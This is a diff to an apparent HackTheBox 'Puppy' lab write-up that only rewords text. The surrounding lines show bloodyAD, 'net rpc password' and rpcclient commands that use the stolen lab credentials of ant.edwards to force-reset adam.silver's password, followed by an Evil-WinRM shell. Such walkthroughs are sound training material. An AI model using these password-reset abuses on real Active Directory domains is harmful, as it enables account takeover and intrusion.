@@ -387,7 +387,7 @@ Found out that `ant.edwards` is a member of `SENIOR DEVS@PUPPY.HTB` group and ha
 &rarr; We can use `ant.edwards` to change the password of `ADAM.SILVER@PUPPY.HTB` and gain access to the machine.
 
 **There are some ways to do this:**
-1. Use `bloodyAD` to change the password of `ADAM.SILVER@PUPPY.HTB`.
+We can use `bloodyAD` to change the password of `ADAM.SILVER@PUPPY.HTB`.
 
 ```bash
 └─$ bloodyAD -u ant.edwards -p 'Antman2025!' -d puppy.htb --dc-ip 10.10.11.70 set password adam.silver 'P@ssw4rd123'
@@ -453,13 +453,13 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\adam.silver\Documents>
 ```
 
-2. Use [ForceChangePassword](https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword) through `rpc`.
+Another approach can use [ForceChangePassword](https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword) through `rpc`.
 
 ```bash
 └─$ net rpc password 'adam.silver' 'P@ssw4rd123' -U 'PUPPY.HTB'/'ant.edwards'%'Antman2025!' -S '10.10.11.70'
 ```
 
-or we can
+or we can use `rpcclient`.
 
 ```bash
 └─$ rpcclient -U 'puppy.htb\Ant.Edwards%Antman2025!' 10.10.11.70
